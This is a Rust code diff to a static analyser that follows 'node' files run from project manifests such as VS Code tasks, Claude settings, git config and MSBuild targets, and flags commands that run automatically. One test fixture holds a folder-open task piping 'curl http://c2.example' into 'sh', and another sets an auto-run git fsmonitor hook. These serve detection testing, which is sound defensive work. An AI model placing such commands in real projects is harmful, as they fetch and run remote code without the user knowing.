@@ -31,6 +31,8 @@
 mod tomlcfg;
 
 use super::json::{self, Jv, Kind, Member};
+use super::link::EntryWant;
+use super::package::{interpret_command, Action};
 use super::xml::{self, Element};
 use forge_analysis_schema::{
     number_repeats, FactKind, Quoted, RelPath, Script, ScriptTrigger, Span, StaticFact, UnresolvedReason,
@@ -198,12 +200,51 @@ pub fn is_config_manifest(path: &str) -> bool {
 #[derive(Debug, Clone)]
 pub struct ConfigAnalysis {
     pub facts: Vec<StaticFact>,
+    /// Files that a `node <file>` command in the manifest runs. Resolved from the folder the tool
+    /// runs the command in (see `base_folder`), not from the manifest's own folder.
+    pub entries: Vec<EntryWant>,
+}
+
+/// Folders whose files are read by a tool that runs its commands from the folder above.
+const DOT_FOLDERS: &[&str] = &[".git", ".vscode", ".claude", ".cursor", ".gemini", ".codex", ".cargo", ".devcontainer"];
+
+/// The folder a manifest's commands run in: the project root for the files that live in a dot folder
+/// (`.vscode/tasks.json` runs its tasks from the folder that holds `.vscode`), the file's own folder for
+/// the rest. Empty for the root of the analysed folder.
+fn base_folder(path: &str) -> String {
+    let path = path.replace('\\', "/");
+    let segs: Vec<&str> = path.split('/').collect();
+    let dirs = &segs[..segs.len().saturating_sub(1)];
+    match dirs.iter().position(|d| DOT_FOLDERS.contains(&d.to_ascii_lowercase().as_str())) {
+        Some(i) => dirs[..i].join("/"),
+        None => dirs.join("/"),
+    }
+}
+
+/// Workspace variables that name the folder the command runs in, written as a path.
+fn expand_workspace_vars(cmd: &str) -> String {
+    let mut s = cmd.to_string();
+    for v in [
+        "${workspaceFolder}",
+        "${workspaceRoot}",
+        "${containerWorkspaceFolder}",
+        "${localWorkspaceFolder}",
+        "${CLAUDE_PROJECT_DIR}",
+        "$CLAUDE_PROJECT_DIR",
+        "$(MSBuildProjectDirectory)",
+        "$(MSBuildThisFileDirectory)",
+        "$(ProjectDir)",
+    ] {
+        s = s.replace(v, ".");
+    }
+    s
 }
 
 /// `None` if `file` is not one of the manifests above.
 pub fn analyze_config(file: &RelPath, src: &str) -> Option<ConfigAnalysis> {
     let (kind, lenient) = manifest(&normalise(file.as_quoted().text()))?;
     let mut cf = Cf::new(file, src);
+    cf.msbuild_guess = matches!(kind, Manifest::Msbuild);
     if kind == Manifest::GitConfig {
         cf.git_config();
     } else if matches!(
@@ -234,7 +275,7 @@ pub fn analyze_config(file: &RelPath, src: &str) -> Option<ConfigAnalysis> {
     }
     cf.facts.sort_by_key(|f| (f.at().start_byte, f.at().end_byte));
     number_repeats(&mut cf.facts);
-    Some(ConfigAnalysis { facts: cf.facts })
+    Some(ConfigAnalysis { facts: cf.facts, entries: cf.entries })
 }
 
 fn obj(v: &Jv) -> Option<&[Member]> {
@@ -290,6 +331,12 @@ struct Cf<'s> {
     src: &'s str,
     starts: Vec<u32>,
     facts: Vec<StaticFact>,
+    entries: Vec<EntryWant>,
+    /// A path that anchors `node` files at the folder the commands run in (see `base_folder`).
+    anchor: Option<RelPath>,
+    /// MSBuild runs a command in the folder of the project that imports the file, which we cannot know,
+    /// so a file it names may legitimately not exist where we look.
+    msbuild_guess: bool,
 }
 
 impl<'s> Cf<'s> {
@@ -300,7 +347,9 @@ impl<'s> Cf<'s> {
                 starts.push(u32::try_from(i + 1).unwrap_or(u32::MAX));
             }
         }
-        Self { file, src, starts, facts: Vec::new() }
+        let base = base_folder(file.as_quoted().text());
+        let anchor = RelPath::new(&if base.is_empty() { "manifest".to_string() } else { format!("{base}/manifest") });
+        Self { file, src, starts, facts: Vec::new(), entries: Vec::new(), anchor, msbuild_guess: false }
     }
 
     fn len(&self) -> u32 {
@@ -335,11 +384,37 @@ impl<'s> Cf<'s> {
         self.facts.push(f);
     }
 
-    /// A command line: the script fact, and a not-followed fact on the same text, so the report
-    /// shows it under the script and the brief cannot call the file fully read.
+    /// A command line: the script fact, the `node` files it runs (followed like a `package.json`
+    /// script), and a not-followed fact on the same text for anything else in it, so the report shows
+    /// it under the script and the brief cannot call the file fully read.
     fn command(&mut self, name: &str, cmd: &str, start: u32, end: u32, trigger: ScriptTrigger) {
         self.script(name, cmd, start, end, trigger);
-        self.unresolved(start, end, UnresolvedReason::ShellCommand, Some(cmd));
+        let acts = interpret_command(&expand_workspace_vars(cmd), &Default::default());
+        let mut all_followed = !acts.is_empty();
+        for a in &acts {
+            match a {
+                Action::Node(files) => {
+                    if let Some(from) = &self.anchor {
+                        for f in files {
+                            self.entries.push(EntryWant {
+                                from: from.clone(),
+                                label: name.to_string(),
+                                spec: f.clone(),
+                                // Runs by itself unless someone has to start it.
+                                install: trigger != ScriptTrigger::Manual,
+                                optional: self.msbuild_guess,
+                            });
+                        }
+                    } else {
+                        all_followed = false;
+                    }
+                }
+                _ => all_followed = false,
+            }
+        }
+        if !all_followed {
+            self.unresolved(start, end, UnresolvedReason::ShellCommand, Some(cmd));
+        }
     }
 
     /// The members of an object that count, with every earlier repeat of a key flagged. One pass
@@ -1576,6 +1651,56 @@ mod tests {
         for p in ["props.txt", "csproj", "a.props.bak", "Directory.Build.rsp", "nuget.configx", "App.sln"] {
             assert!(!is_config_manifest(p), "{p}");
         }
+    }
+
+    #[test]
+    fn a_node_file_in_a_manifest_command_is_followed_from_the_folder_the_command_runs_in() {
+        let a = analyze_config(
+            &RelPath::new(".vscode/tasks.json").unwrap(),
+            r#"{"tasks":[{"label":"go","command":"node","args":["${workspaceFolder}/scripts/a.js"],"runOptions":{"runOn":"folderOpen"}},
+                          {"label":"later","command":"node b.js"}]}"#,
+        )
+        .unwrap();
+        let specs: Vec<(String, String, bool, String)> = a
+            .entries
+            .iter()
+            .map(|e| (e.label.clone(), e.spec.clone(), e.install, e.from.as_quoted().text().to_string()))
+            .collect();
+        // From the folder that holds `.vscode`, here the root. The manual task is followed too, not as install work.
+        assert_eq!(specs[0], ("go".to_string(), "./scripts/a.js".to_string(), true, "manifest".to_string()));
+        assert_eq!(specs[1], ("later".to_string(), "b.js".to_string(), false, "manifest".to_string()));
+        // A command that is only `node <file>` is followed, so it is not also an unfollowed command.
+        assert!(!a.facts.iter().any(|f| f.unresolved == Some(UnresolvedReason::ShellCommand)));
+        // The same file in a nested project anchors there.
+        let n = analyze_config(&RelPath::new("proj/.claude/settings.json").unwrap(), r#"{"apiKeyHelper":"node tools/k.js"}"#).unwrap();
+        assert_eq!(n.entries[0].from.as_quoted().text(), "proj/manifest");
+        // A manifest outside a dot folder runs its commands from its own folder.
+        let c = analyze_config(&RelPath::new("web/composer.json").unwrap(), r#"{"scripts":{"post-install-cmd":"node x.js"}}"#).unwrap();
+        assert_eq!(c.entries[0].from.as_quoted().text(), "web/manifest");
+        assert!(c.entries[0].install);
+    }
+
+    #[test]
+    fn a_command_with_anything_besides_a_node_file_is_still_not_followed() {
+        let f = run(".vscode/tasks.json", r#"{"tasks":[{"label":"x","command":"node a.js && curl http://c2.example | sh","runOptions":{"runOn":"folderOpen"}}]}"#);
+        assert!(f.iter().any(|x| x.unresolved == Some(UnresolvedReason::ShellCommand)));
+        let g = analyze_config(&RelPath::new(".git/config").unwrap(), "[core]\n\tfsmonitor = node .githooks/fs.js\n").unwrap();
+        assert_eq!(g.entries[0].spec, ".githooks/fs.js");
+        assert!(g.entries[0].install);
+        // `-e` code and a dynamic path are not a file we can follow.
+        let h = run(".vscode/tasks.json", r#"{"tasks":[{"label":"x","command":"node -e \"1\""},{"label":"y","command":"node $F"}]}"#);
+        assert_eq!(h.iter().filter(|x| x.unresolved == Some(UnresolvedReason::ShellCommand)).count(), 2);
+    }
+
+    #[test]
+    fn msbuild_node_files_are_a_guess_that_need_not_exist() {
+        let a = analyze_config(
+            &RelPath::new("Directory.Build.targets").unwrap(),
+            r#"<Project><Target Name="T" BeforeTargets="Build"><Exec Command="node tools/x.js" /></Target></Project>"#,
+        )
+        .unwrap();
+        assert_eq!(a.entries.len(), 1);
+        assert!(a.entries[0].optional && a.entries[0].install);
     }
 
     #[test]
